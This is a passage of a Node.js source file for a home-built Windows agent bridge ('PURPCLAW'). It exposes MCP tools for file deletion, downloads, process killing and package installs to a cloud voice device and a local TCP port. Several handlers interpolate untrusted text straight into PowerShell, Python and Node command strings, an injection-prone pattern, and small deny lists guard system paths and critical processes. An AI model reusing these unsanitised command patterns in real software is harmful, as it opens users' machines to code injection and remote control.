        const isDir = fs.statSync(args.source).isDirectory();
        if (isDir) {
          await cmd(`robocopy "${args.source}" "${args.destination}" /E /MOV /NFL /NDL /NJH /NJS /NC /NS /NP 2>nul`, 120000);
          try { fs.rmSync(args.source, { recursive: true, force: true }); } catch (e) {}
          return ok(`Moved directory: ${args.source} -> ${args.destination}`);
        } else {
          await ps(`Move-Item -LiteralPath '${san(args.source)}' -Destination '${san(args.destination)}' -Force`, 30000);
          return ok(`Moved: ${args.source} -> ${args.destination}`);
        }
      } catch (e) { return ok(`Move error: ${e.message}`); }
    }
    case 'file_delete': {
      if (/^[A-Z]:\\(Windows|Program Files|Users\\Admin\\AppData)/i.test(args.path)) return ok('BLOCKED: Cannot delete system paths');
      try {
        await ps(`Remove-Item -LiteralPath '${san(args.path)}' -Force -Recurse -ErrorAction Stop`, 30000);
        return ok(`Deleted: ${args.path}`);
      } catch (e) { return ok(`Delete error: ${e.message}`); }
    }
    case 'dir_create': {
      try { fs.mkdirSync(args.path, { recursive: true }); return ok(`Created directory: ${args.path}`); }
      catch (e) { return ok(`Dir error: ${e.message}`); }
    }
    case 'download_file': {
      try {
        const dest = args.destination || path.join('C:\\Users\\Admin\\Downloads', path.basename(new URL(args.url).pathname) || `download_${Date.now()}`);
        const destDir = path.dirname(dest);
        if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
        await execAsync(`powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri '${san(args.url)}' -OutFile '${dest}' -UseBasicParsing"`, { timeout: 120000 });
        const size = fs.existsSync(dest) ? (fs.statSync(dest).size / 1024).toFixed(1) : '?';
        return ok(`Downloaded: ${dest} (${size}KB)\nFrom: ${args.url}`);
      } catch (e) { return ok(`Download error: ${e.message}`); }
    }
    case 'process_list': {
      try {
        const ps = `
Get-Process | Sort-Object CPU -Descending | Select-Object -First 30 Name, Id, @{N="CPU(s)";E={[math]::Round($_.CPU,1)}}, @{N="MB";E={[math]::Round($_.WorkingSet64/1MB,1)}} | Format-Table -AutoSize | Out-String
`;
        const r = await psScript(ps, 8000);
        return ok(r);
      } catch (e) { return ok(`Process list error: ${e.message}`); }
    }
    case 'process_kill': {
      const blocked = ['explorer', 'csrss', 'lsass', 'winlogon', 'svchost', 'system'];
      if (args.name && blocked.includes(args.name.toLowerCase().replace('.exe', ''))) return ok('BLOCKED: Critical process');
      try {
        if (args.pid) { await cmd(`taskkill /PID ${args.pid} /F`, 5000); return ok(`Killed PID ${args.pid}`); }
        if (args.name) { await cmd(`taskkill /IM "${san(args.name)}" /F`, 5000); return ok(`Killed: ${args.name}`); }
        return ok('Specify name or pid');
      } catch (e) { return ok(`Kill error: ${e.message}`); }
    }
    case 'volume_control': {
      try {
        const action = args.action || 'set';
        if (action === 'mute') {
          await psScript(`$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]173)`, 5000);
          return ok('Muted');
        }
        if (action === 'unmute') {
          await psScript(`$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]173)`, 5000);
          return ok('Unmuted (toggle)');
        }
        const vol = Math.min(100, Math.max(0, args.level || 50));
        const steps = action === 'up' ? 5 : action === 'down' ? -5 : 0;
        if (steps !== 0) {
          const key = steps > 0 ? 175 : 174;
          for (let i = 0; i < Math.abs(steps); i++) await psScript(`$obj = New-Object -ComObject WScript.Shell; $obj.SendKeys([char]${key})`, 2000);
          return ok(`Volume ${action}`);
        }
        await psScript(`
Add-Type -TypeDefinition @'
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume { int f(); int g(); int h(); int i(); int j(); int k(); int l(); int m(); int n(); int o(); int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext); }
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator { int EnumAudioEndpoints(int dataFlow, int dwStateMask, out IntPtr ppDevices); int GetDefaultAudioEndpoint(int dataFlow, int role, out IntPtr ppEndpoint); }
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
public class Audio {
    public static void SetVolume(float level) {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IntPtr dev; enumerator.GetDefaultAudioEndpoint(0, 1, out dev);
        var endpoint = (IAudioEndpointVolume)Marshal.GetObjectForIUnknown(dev);
        endpoint.SetMasterVolumeLevelScalar(level, System.Guid.Empty);
    }
}
'@ -ErrorAction SilentlyContinue
[Audio]::SetVolume(${vol / 100})
`, 8000);
        return ok(`Volume set to ${vol}%`);
      } catch (e) { return ok(`Volume error: ${e.message}`); }
    }
    case 'zip_create': {
      try {
        await ps(`Compress-Archive -Path '${san(args.source)}' -DestinationPath '${san(args.destination)}' -Force`, 30000);
        const size = fs.existsSync(args.destination) ? (fs.statSync(args.destination).size / 1024).toFixed(1) : '?';
        return ok(`Created: ${args.destination} (${size}KB)`);
      } catch (e) { return ok(`Zip error: ${e.message}`); }
    }
    case 'zip_extract': {
      try {
        const dest = args.destination || path.dirname(args.source);
        await ps(`Expand-Archive -Path '${san(args.source)}' -DestinationPath '${san(dest)}' -Force`, 30000);
        return ok(`Extracted: ${args.source} -> ${dest}`);
      } catch (e) { return ok(`Unzip error: ${e.message}`); }
    }
    case 'install_package': {
      try {
        const mgr = args.manager.toLowerCase();
        const pkg = san(args.packages);
        let cmdStr = null;
        if (mgr === 'pip') cmdStr = `pip install ${pkg} --quiet`;
        else if (mgr === 'npm') cmdStr = `npm install ${pkg}`;
        else if (mgr === 'choco') cmdStr = `choco install ${pkg} -y`;
        else return ok(`Unknown manager: ${mgr}`);
        const { stdout, stderr } = await execAsync(cmdStr, { cwd: args.cwd || 'C:\\Users\\Admin\\Desktop', shell: 'powershell.exe', timeout: 120000 }).catch(e => ({ stdout: '', stderr: e.message }));
        return ok(`${mgr} install ${pkg}:\n${(stdout || stderr || 'Done').substring(0, 3000)}`);
      } catch (e) { return ok(`Install error: ${e.message}`); }
    }
    case 'active_window': {
      try {
        const r = await psScript(`
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class Win32 {
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
    [StructLayout(LayoutKind.Sequential)] public struct RECT { public int Left, Top, Right, Bottom; }
}
'@
$h = [Win32]::GetForegroundWindow()
$sb = New-Object System.Text.StringBuilder 256
[Win32]::GetWindowText($h, $sb, 256) | Out-Null
$pid2 = 0; [Win32]::GetWindowThreadProcessId($h, [ref]$pid2) | Out-Null
$proc = Get-Process -Id $pid2 -ErrorAction SilentlyContinue
$rect = New-Object Win32+RECT; [Win32]::GetWindowRect($h, [ref]$rect) | Out-Null
Write-Output "Title: $($sb.ToString())"
Write-Output "Process: $($proc.ProcessName) (PID: $pid2)"
Write-Output "Position: ($($rect.Left),$($rect.Top)) Size: $($rect.Right-$rect.Left)x$($rect.Bottom-$rect.Top)"
Write-Output "CPU: $([math]::Round($proc.CPU,1))s  Memory: $([math]::Round($proc.WorkingSet64/1MB,1))MB"
`, 8000);
        return ok(`Active Window:\n${r}`);
      } catch (e) { return ok(`Context error: ${e.message}`); }
    }
    case 'system_status': {
      try {
        const ps = `
$cpu = (Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average
$gpu = try { (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name } catch { "N/A" }
$mem = Get-CimInstance Win32_OperatingSystem
$freeMem = [math]::Round($mem.FreePhysicalMemory / 1MB, 1)
$totalMem = [math]::Round($mem.TotalVisibleMemorySize / 1MB, 1)
$usedMemPct = [math]::Round((1 - $mem.FreePhysicalMemory / $mem.TotalVisibleMemorySize) * 100, 1)
$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"
$procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, @{N="CPU(s)";E={[math]::Round($_.CPU,1)}}, @{N="MB";E={[math]::Round($_.WorkingSet64/1MB,1)}}
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
$net = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*","Wi-Fi*" | Select-Object -ExpandProperty IPAddress
$gpuMem = try { $vram = (Get-CimInstance Win32_VideoController | Select-Object -First 1).AdapterRAM; if ($vram) { [math]::Round($vram/1GB, 2).ToString() + " GB VRAM" } else { "Shared" } } catch { "N/A" }
$purpStatus = if($purpProc) {"RUNNING"} else {"idle"}
Write-Output "PURPCLAW System Status"
Write-Output "=========================================="
Write-Output ("CPU: " + $cpu + "% | RAM: " + $usedMemPct + "% (" + $freeMem + "GB free of " + $totalMem + "GB)")
Write-Output ("GPU: " + $gpu)
Write-Output ("VRAM: " + $gpuMem)
Write-Output ("Uptime: " + $uptimeStr)
Write-Output "=========================================="
Write-Output "Disk:"
$disk | ForEach-Object { $dTotalGB = [math]::Round($_.Size/1GB,1); $dFreeGB = [math]::Round($_.FreeSpace/1GB,1); Write-Output ("   " + $_.DeviceID + " " + $dFreeGB + "GB free / " + $dTotalGB + "GB total") }
Write-Output "=========================================="
Write-Output ("Network: " + ($net -join ", "))
Write-Output "=========================================="
Write-Output "Top Processes by CPU:"
$procs | Format-Table -AutoSize | Out-String
Write-Output ("PURPCLAW: " + $purpStatus + " | Tools: " + $TOOLS.Length)
`;
        const result = await psScript(ps, 15000);
        return ok(result);
      } catch (e) { 
        return ok(`System status error: ${e.message}`);
      }
    }
    case 'system_paths': {
      return ok(JSON.stringify({
        desktop: 'C:/Users/Admin/Desktop',
        documents: 'C:/Users/Admin/Documents',
        downloads: 'C:/Users/Admin/Downloads',
        pictures: 'C:/Users/Admin/Pictures',
        music: 'C:/Users/Admin/Music',
        videos: 'C:/Users/Admin/Videos',
        thisPc: 'C:/Users/Admin',
        home: 'C:/Users/Admin',
        root: 'C:/',
        temp: 'C:/Users/Admin/AppData/Local/Temp',
        appData: 'C:/Users/Admin/AppData/Roaming',
        localAppData: 'C:/Users/Admin/AppData/Local',
        purpclaw: 'C:/Users/Admin/Desktop/PURPCLAW',
        drive_c: 'C:/',
        drive_d: 'D:/',
        drive_e: 'E:/',
        drive_g: 'G:/',
        drive_k: 'K:/',
        god_folder: 'E:/god folder',
        worldview: 'E:/god folder/02_ACTIVE_PROJECTS/GOTHAM_3077',
        zamp: 'E:/god folder/ZAMP'
      }, null, 2));
    }
    case 'disk_info': {
      try {
        const ps = `
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3"
$disk | ForEach-Object { $dTotalGB = [math]::Round($_.Size/1GB,1); $dFreeGB = [math]::Round($_.FreeSpace/1GB,1); Write-Output ($_.DeviceID + " " + $_.FileSystem + ": " + $dFreeGB + "GB free / " + $dTotalGB + "GB total") }
`;
        const r = await psScript(ps, 8000);
        return ok(r);
      } catch (e) { return ok(`Disk error: ${e.message}`); }
    }
    case 'network_info': {
      try {
        const ps = `
$ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*","Wi-Fi*" | Select-Object -ExpandProperty IPAddress
$pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet
$wifiInfo = try { (netsh wlan show interfaces | Select-String "SSID|Signal|State") -join " " } catch { "N/A" }
$adapters = Get-NetAdapter | Where-Object Status -eq "Up" | Select-Object Name, @{N="Speed";E={$_.LinkSpeed}}
Write-Output "Network Status:"
Write-Output ("IP Addresses: " + ($ipAddr -join ", "))
Write-Output ("Internet: " + $(if($pingResult) {"Connected"} else {"No connection"}))
Write-Output ("WiFi: " + $wifiInfo)
Write-Output "Adapters:"
$adapters | Format-Table -AutoSize | Out-String
`;
        const r = await psScript(ps, 8000);
        return ok(r);
      } catch (e) { return ok(`Network error: ${e.message}`); }
    }
    case 'get_weather': {
      try {
        const location = san(args.location || 'London');
        const r = await psScript(`
$w = Invoke-WebRequest -Uri "https://wttr.in/${encodeURIComponent(location)}?format=3" -TimeoutSec 10 -UseBasicParsing
Write-Output $w.Content
`, 15000);
        return ok(r.trim() || `Weather for ${location} unavailable`);
      } catch (e) { return ok(`Weather error: ${e.message}`); }
    }
    case 'search_music': {
      try {
        const query = san(args.query || '');
        if (!query) return ok('Query required');
        return ok(`Music search: "${query}"\n\nOpen browser to: https://music.youtube.com/search?q=${encodeURIComponent(query)}`);
      } catch (e) { return ok(`Music search error: ${e.message}`); }
    }
    case 'play_music': {
      try {
        const query = san(args.query || '');
        if (!query) return ok('Query required');
        // RIP-OUT FIX: was `start chrome "..."` via cmd.exe (leaked).
        // Use trackedSpawn with the URL handler. If the user wants
        // Chrome specifically, they can pre-set the default browser.
        const url = `https://music.youtube.com/search?q=${encodeURIComponent(query)}`;
        trackedSpawn('rundll32', ['url.dll,FileProtocolHandler', url], {
          tag: `play_music(${query})`, timeoutMs: 5_000, windowsHide: true,
        });
        return ok(`Opening YouTube Music: "${query}"`);
      } catch (e) { return ok(`Play music error: ${e.message}`); }
    }
    case 'search_knowledge': {
      try {
        const query = san(args.query || '');
        if (!query) return ok('Query required');
        const r = await psScript(`
$w = Invoke-WebRequest -Uri "https://en.wikipedia.org/w/api.php?action=opensearch&search=${encodeURIComponent(query)}&limit=5&format=json" -TimeoutSec 10 -UseBasicParsing
$data = $w.Content | ConvertFrom-Json
if ($data[1].Count -gt 0) {
  Write-Output "Wikipedia results for '${query}':"
  for ($i = 0; $i -lt $data[1].Count; $i++) { Write-Output "  $($i+1). $($data[1][$i])" }
} else {
  Write-Output "No Wikipedia results for '${query}'"
}
`, 15000);
        return ok(r.trim() || `No results for "${query}"`);
      } catch (e) { return ok(`Knowledge search error: ${e.message}`); }
    }
    case 'search_memory': {
      try {
        const query = (args.query || '').toLowerCase();
        const mem = loadMemory();
        const entries = mem.facts || [];
        const results = entries.filter(e => 
          (e.c && e.c.toLowerCase().includes(query)) ||
          (e.tags && e.tags.some(t => t.toLowerCase().includes(query)))
        );
        if (results.length === 0) return ok(`No memory matches for: ${query}`);
        const out = results.slice(0, 10).map((e, i) => `${i + 1}. ${e.c.substring(0, 200)} (${e.t || 'unknown'})`).join('\n');
        return ok(`Memory matches (${results.length}):\n${out}`);
      } catch (e) { return ok(`Memory search error: ${e.message}`); }
    }
    default: {
      // Not a hand-coded builtin — try the canonical tool registry (permission-gated).
      const TR = getToolRuntime();
      if (TR.registry.has(name)) {
        try {
          const r = await TR.invoke(name, args || {}, { source: 'unified_api' });
          if (r && r.ok === false) return ok(`Tool ${name} denied/failed: ${r.error || r.code || 'error'}`);
          const body = (r && (r.content ?? r.text ?? r.message ?? r.result));
          return ok(typeof body === 'string' ? body : JSON.stringify(body ?? r));
        } catch (e) { return ok(`Tool ${name} error: ${e.message}`); }
      }
      return ok(`Unknown tool: ${name}`);
    }
  }
}

async function handleRpc(req) {
  const { id, method, params } = req;
  switch (method) {
    case 'initialize': return { jsonrpc: '2.0', id, result: { protocolVersion: '2024-11-05', capabilities: { tools: { listChanged: false } }, serverInfo: { name: 'purpclaw-v7.0', version: '7.0.0' } } };
    case 'initialized': return { jsonrpc: '2.0', id, result: {} };
    case 'notifications/initialized': return null;
    case 'tools/list':
      loadDynamicSkills();
      {
        const tools = require('./lib/tools').list();
        console.log(`[BRIDGE] ${tools.length} canonical tools`);
        return { jsonrpc: '2.0', id, result: { tools } };
      }
    case 'tools/call': {
      const { name, arguments: a } = params || {};
      if (!name) return { jsonrpc: '2.0', id, error: { code: -32602, message: 'No tool' } };
      const res = await executeTool(name, a || {});
      const slowTools = ['browser_open', 'browser_click', 'browser_navigate', 'mouse_click', 'find_and_click'];
      if (slowTools.includes(name)) await new Promise(r => setTimeout(r, 800));
      return { jsonrpc: '2.0', id, result: res };
    }
    case 'ping': return { jsonrpc: '2.0', id, result: {} };
    default: return { jsonrpc: '2.0', id, error: { code: -32601, message: `Unknown: ${method}` } };
  }
}

let ws = null, hb = null, rc = null, reconnectAttempts = 0;
let deadConnectionTimer = null;

function connectWS() {
  if (rc) clearTimeout(rc);
  if (deadConnectionTimer) { clearTimeout(deadConnectionTimer); deadConnectionTimer = null; }
  if (ws) { try { ws.terminate(); } catch (_) {} ws = null; }

  if (!xiaozhiLink.url) {
    xiaozhiLink.status = 'idle';
    return; // no URL configured — retry lazily when /api/xazhi/link sets one
  }
  reconnectAttempts++;
  xiaozhiLink.status = 'connecting';
  console.log(`[WS] Connecting to Xiaozhi cloud... (attempt ${reconnectAttempts})`);
  ws = new WebSocket(xiaozhiLink.url);

  ws.on('open', () => {
    reconnectAttempts = 0;
    xiaozhiLink.status = 'connected';
    xiaozhiLink.lastError = null;
    xiaozhiLink.lastConnectedAt = new Date().toISOString();
    console.log('[WS] Connected to Xiaozhi cloud');
    if (hb) clearInterval(hb);
    hb = setInterval(() => { if (ws?.readyState === WebSocket.OPEN) ws.ping(); }, 25000);
  });

  ws.on('message', async (data) => {
    try {
      const raw = data.toString();
      let parsed = null;
      try { parsed = JSON.parse(raw); } catch (_) { parsed = {}; }

      // Handle MCP JSON-RPC protocol messages
      if (parsed.method && parsed.jsonrpc === '2.0') {
        const resp = await handleRpc(parsed);
        if (resp && ws?.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify(resp));
        }
        return;
      }

      // Handle voice commands from ball (proprietary protocol)
      if (parsed.type === 'voice_command' || parsed.type === 'voice_text' || parsed.text || parsed.command) {
        const command = parsed.text || parsed.command || parsed.content;
        if (command) {
          console.log('[BALL] Voice command:', command.substring(0, 100));
          broadcast({ type: 'ball_voice_command', command, timestamp: new Date().toISOString() });

          if (AgentTower && AgentTower.broadcast) {
            AgentTower.broadcast({ type: 'ball_voice_command', command, timestamp: new Date().toISOString() });
          }

          // Friend routing (Law 2026-08-25): a known friend's turn resolves to
          // their Soul + memory namespace BEFORE any agent auto-spawn. Friend
          // turns are conversations, not orchestration commands.
          try {
            const { resolveFriendTurn } = require('./lib/friend-turn');
            const handled = await resolveFriendTurn({
              text: command,
              explicitName: parsed.friend || undefined,
              source: parsed.source || 'xiaozhi-ball',
              deviceId: parsed.deviceId || undefined,
              sessionId: parsed.sessionId || undefined,
              respond: (reply) => {
                if (ws && ws.readyState === WebSocket.OPEN) {
                  ws.send(JSON.stringify({ type: 'friend_reply', soul: reply.soul, name: reply.name, text: reply.text, timestamp: new Date().toISOString() }));
                }
                broadcast({ type: 'friend_reply', soul: reply.soul, name: reply.name, text: reply.text, timestamp: new Date().toISOString() });
              },
            });
            if (handled) return;
          } catch (e) {
            console.error('[FRIEND] resolver error:', e.message);
          }

          // Check for explicit spawn commands first
          const agentMatch = command.match(/spawn (\w+)|agent (\w+)|launch (\w+)/i);
          if (agentMatch) {
            const agentName = agentMatch[1] || agentMatch[2] || agentMatch[3];
            if (AgentTower && AgentTower.spawnAgent) {
              AgentTower.spawnAgent(agentName.toLowerCase(), command);
              broadcast({ type: 'ball_spawn_request', agentName, command, timestamp: new Date().toISOString() });
            }
          } else {
            // Auto-spawn relevant agents based on keywords in the command
            const lowerCmd = command.toLowerCase();
            const autoSpawn = [];

            if (lowerCmd.includes('code') || lowerCmd.includes('build') || lowerCmd.includes('implement') || lowerCmd.includes('write')) {
              autoSpawn.push('robot', 'bee', 'dragon');
            }
            if (lowerCmd.includes('security') || lowerCmd.includes('scan') || lowerCmd.includes('audit') || lowerCmd.includes('protect')) {
              autoSpawn.push('ghost', 'owl', 'guardian');
            }
            if (lowerCmd.includes('data') || lowerCmd.includes('analyze') || lowerCmd.includes('research') || lowerCmd.includes('find')) {
              autoSpawn.push('duck', 'spider', 'scientist');
            }
            if (lowerCmd.includes('test') || lowerCmd.includes('qa') || lowerCmd.includes('check') || lowerCmd.includes('verify')) {
              autoSpawn.push('cactus', 'turtle', 'ghost');
            }
            if (lowerCmd.includes('manage') || lowerCmd.includes('coordinate') || lowerCmd.includes('plan') || lowerCmd.includes('organize')) {
              autoSpawn.push('wolf', 'penguin', 'owl');
            }
            if (lowerCmd.includes('test') || lowerCmd.includes('run') || lowerCmd.includes('execute')) {
              autoSpawn.push('mantis', 'shark');
            }

            // Spawn up to 3 matching agents
            for (const agentName of autoSpawn.slice(0, 3)) {
              if (AgentTower && AgentTower.spawnAgent) {
                const result = await AgentTower.spawnAgent(agentName, `Voice task: ${command.substring(0, 50)}`, {});
                if (result.success) {
                  broadcast({ type: 'ball_auto_spawn', agentName, command: command.substring(0, 50), timestamp: new Date().toISOString() });
                }
              }
            }
          }
        }
        return;
      }

      // Handle query messages
      if (parsed.type === 'query') {
        if (parsed.query === 'tower_status' || parsed.query === 'status') {
          if (ws && ws.readyState === WebSocket.OPEN) {
            const status = AgentTower.getAgentStatus();
            ws.send(JSON.stringify({ type: 'status_response', data: status }));
          }
        }
        return;
      }

      // If we get here, it's an unknown message type - log it
      if (parsed.method !== 'ping') {
        console.log('[WS] Unknown message type:', raw.substring(0, 100));
      }
    } catch (e) { console.error('[WS] ERR:', e.message); }
  });

  ws.on('close', c => {
    console.log(`[WS] Disconnected (${c})`);
    if (hb) clearInterval(hb);
    if (xiaozhiLink.status !== 'unauthorized') xiaozhiLink.status = 'disconnected';
    recon();
  });

  ws.on('error', e => {
    console.error(`[WS] ERR: ${e.message}`);
    const unauthorized = /401|unauthorized|invalid token/i.test(e.message || '');
    if (unauthorized) {
      // Dead/rotated credential — hammering at 10s max just spams the cloud.
      // Back off hard; a fresh URL via POST /api/xiaozhi/link reconnects fast.
      xiaozhiLink.status = 'unauthorized';
      xiaozhiLink.lastError = e.message;
      console.log('[WS] 401-class failure — backing off 60s until link URL is refreshed');
      if (rc) clearTimeout(rc);
      rc = setTimeout(connectWS, 60000);
      return;
    }
    xiaozhiLink.lastError = e.message;
    recon();
  });
}

function recon() {
  if (rc) clearTimeout(rc);
  // Exponential backoff: 1s, 2s, 4s, 8s, max 10s
  const delay = Math.min(1000 * Math.pow(2, reconnectAttempts - 1), 10000);
  console.log(`[WS] Reconnecting in ${delay / 1000}s... (attempt ${reconnectAttempts + 1})`);
  rc = setTimeout(connectWS, delay);
}

// DEPRECATED: connectBall merged into connectWS - both protocols now handled on single connection
// Keeping function for backwards compatibility but it's a no-op
function connectBall() {
  console.log('[BALL] Using unified WS connection (connectBall deprecated)');
  AgentTower.connectToBall(xiaozhiLink.url);
}

function scheduleBallReconnect() {}

function startLocalTcpServer() {
  const LOCAL_CMD_PORT = 7778;
  const server = net.createServer((socket) => {
    let buffer = '';
    socket.on('data', async (data) => {
      buffer += data.toString();
      let newline = null;
      while ((newline = buffer.indexOf('\n')) !== -1) {
        const line = buffer.slice(0, newline).trim();
        buffer = buffer.slice(newline + 1);
        if (!line) continue;
        try {
          const cmd = JSON.parse(line);
          console.log('[TCP] <-', JSON.stringify(cmd).substring(0, 100));
          const resp = await handleRpc(cmd);
          if (resp) {
            socket.write(JSON.stringify(resp) + '\n');
            console.log('[TCP] ->', JSON.stringify(resp).substring(0, 100));
          }
        } catch (e) {
          console.error('[TCP] ERR:', e.message);
          try { socket.write(JSON.stringify({ jsonrpc: '2.0', error: { code: -32603, message: e.message } }) + '\n'); } catch (_) {}
        }
      }
    });
    socket.on('error', (e) => { if (e.code !== 'ECONNRESET') console.error('[TCP] socket err:', e.message); });
  });
  server.on('error', (e) => { if (e.code === 'EADDRINUSE') console.log('[TCP] Port 7778 in use'); else console.error('[TCP] server error:', e.message); });
  server.listen(LOCAL_CMD_PORT, '127.0.0.1', () => console.log(`[TCP] Listening on 127.0.0.1:${LOCAL_CMD_PORT}`));
}

let bridgeWs = null;

function connectToBridge() {
  try {
    bridgeWs = net.createConnection(7778, '127.0.0.1', () => {
      state.sammyStatus = 'ready';
      console.log('[CONTROL API] Connected to bridge');
    });
    bridgeWs.on('data', (data) => {
      try { const msg = JSON.parse(data.toString()); handleBridgeMessage(msg); } catch (e) {}
    });
    bridgeWs.on('close', () => {
      state.sammyStatus = 'connecting';
      console.log('[CONTROL API] Bridge disconnected, reconnecting...');
      setTimeout(connectToBridge, 2000);
    });
    bridgeWs.on('error', () => { state.sammyStatus = 'error'; });
  } catch (e) {
    state.sammyStatus = 'error';
    setTimeout(connectToBridge, 2000);
  }
}

function handleBridgeMessage(msg) {
  const entry = { timestamp: new Date().toISOString(), type: msg.type || 'unknown', data: msg };
  state.logs.unshift(entry);
  if (state.logs.length > state.maxLogs) state.logs.pop();
  // Broadcast to live subscribers
  for (const fn of logSubscribers) {
    try { fn(entry); } catch {}
  }
  if (msg.type === 'tool_call') state.sammyCurrentTask = msg.name;
  else if (msg.type === 'tool_result' || msg.type === 'error') state.sammyCurrentTask = null;
  if (msg.type === 'swarm_spawn' || msg.type === 'swarm_result') state.swarmAgents[msg.agentId || msg.agent] = { ...msg, timestamp: new Date().toISOString() };
}

function sendToBridge(msg) {
  if (bridgeWs && !bridgeWs.destroyed) {
    bridgeWs.write(JSON.stringify(msg) + '\n');
    console.log(`[CONTROL API] -> Bridge: ${JSON.stringify(msg).substring(0, 100)}`);
  } else console.log(`[CONTROL API] Bridge write FAILED - not connected`);
}

function broadcast(event) {
  const data = `data: ${JSON.stringify(event)}\n\n`;
  state.sseClients.forEach(clientInfo => {
    try { clientInfo.res.write(data); clientInfo.lastHeartbeat = Date.now(); }
    catch (e) { state.sseClients = state.sseClients.filter(c => c !== clientInfo); }
  });
}

function spawnDivisionAgent(division, task, agentName = null) {
  const agentId = `${division}-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
  let command = '', args = [];
  switch (division) {
    case 'AI Research': command = 'py'; args = ['-c', `print("AI Research agent working on: ${task}")`]; break;
    case 'Media Ops': command = 'ffmpeg'; args = ['-version']; break;
    case 'Security': command = 'powershell'; args = ['-Command', `Write-Host "Security scan: ${task}"`]; break;
    case 'Data Mining': command = 'node'; args = ['-e', `console.log("Data mining: ${task}")`]; break;
    case 'Engineering': command = 'git'; args = ['status']; break;
    case 'Design': command = 'py'; args = ['-c', `print("Design task: ${task}")`]; break;
    case 'Management': command = 'cmd'; args = ['/c', 'echo', `Management: ${task}`]; break;
    case 'Infrastructure': command = 'powershell'; args = ['-Command', `Get-Service | Select-Object -First 1`]; break;
    default: command = 'cmd'; args = ['/c', 'echo', `Agent ${division}: ${task}`];
  }
  try {
    const proc = spawn(command, args, { stdio: ['pipe', 'pipe', 'pipe'], shell: false });
    const pid = proc.pid;
    state.activeProcesses[pid] = { agentId, division, task, startTime: new Date().toISOString(), process: proc };
    proc.stdout.on('data', (data) => {
      const output = data.toString().trim();
      if (output) {
        state.logs.unshift({ timestamp: new Date().toISOString(), type: 'agent_output', data: { agentId, division, output } });
        if (state.logs.length > state.maxLogs) state.logs.pop();
        broadcast({ type: 'agent_output', agentId, division, output, timestamp: new Date().toISOString() });
        if (AgentTower && AgentTower.broadcast) {
          AgentTower.broadcast({ type: 'agent_output', agentId, division, output, timestamp: new Date().toISOString() });
        }
      }
    });
    proc.stderr.on('data', (data) => {
      const error = data.toString().trim();
      if (error) {
        state.logs.unshift({ timestamp: new Date().toISOString(), type: 'agent_error', data: { agentId, division, error } });
        if (state.logs.length > state.maxLogs) state.logs.pop();
        broadcast({ type: 'agent_error', agentId, division, error, timestamp: new Date().toISOString() });
        if (AgentTower && AgentTower.broadcast) {
          AgentTower.broadcast({ type: 'agent_error', agentId, division, error, timestamp: new Date().toISOString() });
        }
      }
    });
    proc.on('close', (code) => {
      delete state.activeProcesses[pid];
      state.logs.unshift({ timestamp: new Date().toISOString(), type: 'agent_exit', data: { agentId, division, exitCode: code } });
      if (state.logs.length > state.maxLogs) state.logs.pop();
      broadcast({ type: 'agent_exit', agentId, division, exitCode: code, timestamp: new Date().toISOString() });
      if (AgentTower && AgentTower.broadcast) {
        AgentTower.broadcast({ type: 'agent_exit', agentId, division, exitCode: code, timestamp: new Date().toISOString() });
      }
    });
    state.swarmAgents[agentId] = { id: agentId, name: agentName, division, status: 'working', currentTask: task, pid, startTime: new Date().toISOString() };
    const spawnEntry = { timestamp: new Date().toISOString(), type: 'swarm_spawn', data: { agentId, name: agentName, division, task } };
    state.logs.unshift(spawnEntry);
    if (state.logs.length > state.maxLogs) state.logs.pop();
    broadcast({ type: 'swarm_spawn', agentId, name: agentName, division, task, timestamp: new Date().toISOString() });
    if (AgentTower && AgentTower.broadcast) {
      AgentTower.broadcast({ type: 'swarm_spawn', agentId, name: agentName, division, task, timestamp: new Date().toISOString() });
    }
    return agentId;
  } catch (e) { console.error(`Failed to spawn agent for ${division}:`, e); return null; }
}

function killAgent(agentId) {
  for (const [pid, info] of Object.entries(state.activeProcesses)) {
    if (info.agentId === agentId) {
      try { info.process.kill(); delete state.activeProcesses[pid]; delete state.swarmAgents[agentId]; broadcast({ type: 'swarm_kill', agentId, timestamp: new Date().toISOString() }); if (AgentTower && AgentTower.broadcast) { AgentTower.broadcast({ type: 'swarm_kill', agentId, timestamp: new Date().toISOString() }); } return true; }
      catch (e) { console.error(`Failed to kill agent ${agentId}:`, e); return false; }
    }
  }
  return false;
}

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => { try { resolve(body ? JSON.parse(body) : {}); } catch (e) { reject(new Error('Invalid JSON')); } });
    req.on('error', reject);
  });
}

// Fold chat attachments into a short preamble the agent can act on. Uploaded
